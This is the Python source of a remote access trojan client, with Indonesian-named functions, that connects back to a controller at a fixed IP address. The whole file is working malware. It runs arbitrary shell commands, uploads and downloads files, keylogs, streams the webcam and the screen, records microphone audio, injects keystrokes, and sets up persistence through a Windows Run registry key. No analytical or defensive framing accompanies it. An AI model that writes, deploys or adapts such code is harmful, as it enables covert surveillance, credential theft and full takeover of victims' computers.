import sys
import time
import socket
import json
import subprocess
from subprocess import PIPE
import os
import threading
from Logger import Keylogger
import cv2
import pickle
import struct
import pyautogui
from vidstream import ScreenShareClient
import shutil
import pyaudio
from pynput.keyboard import Key, Controller

sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

keyb = Controller()
def acc_keystroke():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('192.168.18.210', 9995))
        while True:
            data = s.recv(1024)
            if not data:
                break
            command = data.decode()
            try:
                if command.lower() == 'enter':
                    keyb.press(Key.enter)
                    keyb.release(Key.enter)
                if command.lower() == 'space':
                    keyb.press(Key.space)
                    keyb.release(Key.space)
                else:
                    keyb.type(command)
            except Exception as e:
                print(f'{e}')
                break
            

FORMAT = pyaudio.paInt16
CHANNEL = 1
RATE = 44100
CHUNK = 1024

def record_n_send():
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNEL,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)
    print('Recording')
    frame = []
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('192.168.18.210', 9996))
            for _ in range(0, int(RATE / CHUNK * 5)):
                data = stream.read(CHUNK)
                s.sendall(data)
            print('Record done')
    except socket.error as e:
        print(f'{e}')
    finally:
        print('done')
        stream.stop_stream()
        stream.close()
        audio.terminate()

def  execute_persistence(nama_registry, file_exe):
    file_path = os.environ['appdata']+'\\'+file_exe
    try:
        if not os.path.exists(file_path):
            shutil.copyfile(sys.executable, file_path)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ' + nama_registry + ' /t REG_SZ /d "' + file_path + '"', shell=True)
        else:
            pass
    except:
        pass

def byte_stream_recorder():
    send = ScreenShareClient('192.168.18.210', 9997)
    
    t =  threading.Thread(target=send.start_stream)
    t.start()

    while input("") != 'stop':
          continue
    send.stop_stream()

def byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.18.210', 9998))
    vid = cv2.VideoCapture(0)
    while (vid.isOpened()):
        img, frame = vid.read()
        b = pickle.dumps(frame)
        message = struct.pack("Q", len(b))+b
        sock.sendall(message)

def kirim_byte_stream():
    t = threading.Thread(target=byte_stream)
    t.start()


def open_log():
    sok.send(Keylogger().baca_log().encode())

def log_thread():
    t = threading.Thread(target=open_log)
    t.start()

def download_file(namafile):
    file = open(namafile, 'wb')
    sok.settimeout(1)
    _file = sok.recv(100000)
    while _file:
        file.write(_file)
        try:
            _file = sok.recv(100000)
        except socket.timeout as e:
            break
    sok.settimeout(None)
    file.close()

def upload_file(namafile):
    file = open(namafile, 'rb')
    sok.send(file.read())
    file.close()

def terima_perintah():
    data = ''
    while True:
        try:
            data = data + sok.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def jalankan_perintah():
    while True:
        perintah = terima_perintah()
        if perintah == ('keluar'):
            break
        if perintah == 'clear':
            pass
        elif perintah[:3] == 'cd ':
            os.chdir(perintah[3:])
        elif perintah[:8] == 'download':
            upload_file(perintah[9:])
        elif perintah[:6] == 'upload':
            download_file(perintah[7:])
        elif perintah == 'start_log':
            Keylogger().start_log()
        elif perintah == 'baca_log':
            log_thread()
        elif perintah == 'stop_log':
            Keylogger().stop_listener()
        elif perintah == 'start_cam':
            kirim_byte_stream()
        elif perintah == 'screensh':
            ss = pyautogui.screenshot()
            ss.save('ss.png')
            upload_file('ss.png')
        elif perintah == 'screensr':
            byte_stream_recorder()
        elif perintah[:11] == 'persistence':
            nama_registry, file_exe = perintah[12:].split(' ')
            execute_persistence(nama_registry, file_exe)
        elif perintah == 'help':
            pass
        elif perintah == 'rec_audio':
            record_n_send()
        elif perintah == 'banner':
            pass
        elif perintah == 'send':
            acc_keystroke()
        else:
            exe = subprocess.Popen(
            perintah,
            shell=True,
            stdout=PIPE,
            stderr=PIPE,
            stdin=PIPE
        )
            data =exe.stdout.read() + exe.stderr.read()
            data = data.decode()
            output = json.dumps(data)
            sok.send(output.encode())

def execute_persist():
    while True:
        try:
            time.sleep(10)
            sok.connect(('192.168.18.210', 9999))
            jalankan_perintah()
            sok.close()
            break
        except:
            execute_persist()

execute_persist() 
